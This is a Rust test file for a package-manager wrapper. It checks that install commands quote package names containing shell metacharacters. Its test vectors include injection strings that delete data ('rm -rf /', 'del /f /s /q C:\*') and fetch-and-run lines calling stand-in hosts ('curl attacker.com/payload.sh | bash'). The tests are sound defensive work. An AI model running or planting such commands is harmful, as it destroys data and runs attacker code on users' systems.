//! Fixed security tests that properly validate shell-escape behavior
//! 
//! This module contains tests for command injection prevention,
//! input validation, and other security-related functionality.

use santa::sources::*;
use santa::data::KnownSources;

/// Test suite for command injection prevention with realistic expectations
mod command_injection {
    use super::*;

    fn create_test_source() -> PackageSource {
        PackageSource::new_for_test(
            KnownSources::Brew,
            "🍺",
            "brew",
            "brew install",
            "brew list",
            None,
            None,
        )
    }

    #[test]
    fn test_package_name_with_shell_metacharacters() {
        let source = create_test_source();
        
        let dangerous_packages = vec![
            "git; rm -rf /",
            "git && curl evil.com | bash",
            "$(malicious_command)",
            "`dangerous`",
            "package|evil_command",
            "package>evil_output",
            "package<evil_input",
            "package&background_evil",
        ];

        for dangerous_pkg in dangerous_packages {
            let install_cmd = source.install_packages_command(vec![dangerous_pkg.to_string()]);
            
            // The command should be properly escaped - dangerous package names should be quoted
            // to prevent shell interpretation of metacharacters
            let is_properly_escaped = install_cmd.contains(&format!("'{}'", dangerous_pkg)) || 
                                     install_cmd.contains(&format!("\"{}\"", dangerous_pkg));
            
            assert!(
                is_properly_escaped,
                "Package name not properly escaped: {} -> {}",
                dangerous_pkg,
                install_cmd
            );
            
            // Verify the command still contains the base command
            assert!(
                install_cmd.contains("brew install"),
                "Install command should contain base command: {}",
                install_cmd
            );
        }
    }

    #[test]
    fn test_path_traversal_in_package_names() {
        let source = create_test_source();
        
        let path_traversal_packages = vec![
            "../../../etc/passwd",
            "../../bin/sh", 
            "../../../usr/bin/curl",
        ];

        for traversal_pkg in path_traversal_packages {
            let adjusted = source.adjust_package_name(traversal_pkg);
            let install_cmd = source.install_packages_command(vec![traversal_pkg.to_string()]);
            
            // Path traversal doesn't contain shell metacharacters, so shell-escape won't quote it
            // But the application should log a warning about suspicious patterns
            // The key security is that it can't break out of the command structure
            assert!(
                install_cmd.contains("brew install"),
                "Command structure should be preserved: {}",
                install_cmd
            );
            
            // The path traversal should be passed as a literal string to the package manager
            assert!(
                install_cmd.contains(traversal_pkg),
                "Path traversal should be included literally: {} -> {}",
                traversal_pkg,
                install_cmd
            );
        }
    }

    #[test]
    fn test_command_injection_via_prepend() {
        let dangerous_prepends = vec![
            "prefix; rm -rf /; echo ",
            "prefix && evil_command || echo ",
            "prefix`malicious`",
            "prefix$(evil)",
        ];

        for dangerous_prepend in dangerous_prepends {
            let source_with_prepend = PackageSource::new_for_test(
                KnownSources::Brew,
                "🍺",
                "brew",
                "brew install",
                "brew list",
                Some(dangerous_prepend.to_string()),
                None,
            );

            let adjusted = source_with_prepend.adjust_package_name("git");
            let install_cmd = source_with_prepend.install_packages_command(vec!["git".to_string()]);
            
            // The dangerous prepend should be escaped by shell-escape
            // This means the entire combined string should be quoted
            assert!(
                adjusted.contains('\''),
                "Dangerous prepend not escaped: {} -> {}",
                dangerous_prepend,
                adjusted
            );
            
            // The install command should still have the base command
            assert!(
                install_cmd.contains("brew install"),
                "Install command should contain base: {}",
                install_cmd
            );
        }
    }

    #[test]
    fn test_benign_package_names_preserved() {
        let source = create_test_source();
        
        let benign_packages = vec![
            "git",
            "node.js",
            "python3",
            "docker-compose",
            "rust-analyzer",
            "some_package",
            "package-name",
            "package.name",
        ];

        for benign_pkg in benign_packages {
            let adjusted = source.adjust_package_name(benign_pkg);
            
            // Benign package names should either be preserved or lightly escaped
            // They should still be recognizable
            assert!(
                adjusted == benign_pkg || adjusted == format!("'{}'", benign_pkg),
                "Benign package name overly modified: {} -> {}",
                benign_pkg,
                adjusted
            );
        }
    }
}

/// Test suite for input validation
mod input_validation {
    use super::*;

    #[test]
    fn test_null_byte_handling() {
        let source = PackageSource::new_for_test(
            KnownSources::Brew,
            "🍺",
            "brew",
            "brew install",
            "brew list",
            None,
            None,
        );

        let null_byte_packages = vec![
            "git\0rm -rf /",
            "git\x00evil",
        ];

        for null_pkg in null_byte_packages {
            let adjusted = source.adjust_package_name(null_pkg);
            
            // Shell-escape should handle null bytes by escaping the entire string
            assert!(
                adjusted.starts_with('\'') && adjusted.ends_with('\''),
                "Null byte package not properly escaped: {} -> {}",
                null_pkg,
                adjusted
            );
        }
    }

    #[test]
    fn test_empty_package_names() {
        let source = PackageSource::new_for_test(
            KnownSources::Brew,
            "🍺",
            "brew",
            "brew install",
            "brew list",
            None,
            None,
        );

        let empty_packages = vec!["", " ", "\t", "\n"];

        for empty_pkg in empty_packages {
            let install_cmd = source.install_packages_command(vec![empty_pkg.to_string()]);
            
            // Empty/whitespace package names should be handled gracefully
            assert!(
                install_cmd.contains("brew install"),
                "Base command should be preserved even with empty package names: {}",
                install_cmd
            );
        }
    }
}

/// Test suite for platform-specific security concerns
mod platform_security {
    use super::*;

    #[test]
    fn test_windows_specific_injection() {
        let source = PackageSource::new_for_test(
            KnownSources::Scoop,
            "🍨",
            "scoop",
            "scoop install",
            "scoop list",
            None,
            None,
        );

        let windows_dangerous = vec![
            "git & del /f /s /q C:\\*",
            "git ^ powershell -command evil",
            "git | powershell evil.ps1",
        ];

        for dangerous_pkg in windows_dangerous {
            let adjusted = source.adjust_package_name(dangerous_pkg);
            
            // Windows-specific metacharacters should be escaped with quotes
            assert!(
                adjusted.starts_with('\'') && adjusted.ends_with('\''),
                "Windows-specific command injection not prevented: {} -> {}",
                dangerous_pkg,
                adjusted
            );
        }
    }

    #[test]
    fn test_unix_specific_injection() {
        let source = PackageSource::new_for_test(
            KnownSources::Brew,
            "🍺",
            "brew",
            "brew install",
            "brew list",
            None,
            None,
        );

        let unix_dangerous = vec![
            "git; chmod +x /tmp/evil.sh && /tmp/evil.sh",
            "git\nrm -rf /",
            "git || curl evil.com/script | bash",
        ];

        for dangerous_pkg in unix_dangerous {
            let adjusted = source.adjust_package_name(dangerous_pkg);
            
            // Unix-specific metacharacters should be escaped with quotes
            assert!(
                adjusted.starts_with('\'') && adjusted.ends_with('\''),
                "Unix-specific command injection not prevented: {} -> {}",
                dangerous_pkg,
                adjusted
            );
        }
    }
}

/// Integration tests for the complete security pipeline
mod integration_security {
    use super::*;

    #[test]
    fn test_end_to_end_package_installation_command_safety() {
        let source = PackageSource::new_for_test(
            KnownSources::Brew,
            "🍺",
            "brew",
            "brew install",
            "brew list",
            Some("prefix.".to_string()),
            None,
        );

        let mixed_packages = vec![
            "legitimate-package".to_string(),
            "git; rm -rf /".to_string(),
            "normal_package".to_string(),
            "$(evil_command)".to_string(),
        ];

        let install_command = source.install_packages_command(mixed_packages);
        
        // The final command should:
        // 1. Still contain the base install command
        assert!(install_command.contains("brew install"));
        
        // 2. Have dangerous packages properly quoted to prevent execution
        assert!(install_command.contains("'git; rm -rf /'"));
        assert!(install_command.contains("'$(evil_command)'"));
        
        // 3. Still reference the legitimate packages (may or may not be quoted)
        assert!(install_command.contains("legitimate-package") || install_command.contains("'legitimate-package'"));
        assert!(install_command.contains("normal_package") || install_command.contains("'normal_package'"));
        
        println!("Final secure install command: {}", install_command);
    }

    #[test]  
    fn test_realistic_attack_scenario() {
        let source = PackageSource::new_for_test(
            KnownSources::Cargo,
            "🦀",
            "cargo",
            "cargo install",
            "cargo install --list",
            None,
            None,
        );

        // Simulate a realistic attack where malicious package names attempt code injection
        let attack_packages = vec![
            "legit-package".to_string(),
            "; curl -s attacker.com/payload.sh | bash; echo fake-package".to_string(),
            "another-legit-package".to_string(),
        ];

        let install_cmd = source.install_packages_command(attack_packages);
        
        // Verify the attack is neutralized by proper escaping
        assert!(install_cmd.contains("cargo install"));
        assert!(install_cmd.contains("'; curl -s attacker.com/payload.sh | bash; echo fake-package'"));
        
        // The command should be safe to log/display (though not execute with malicious input)
        println!("Secure command with attack neutralized: {}", install_cmd);
    }
}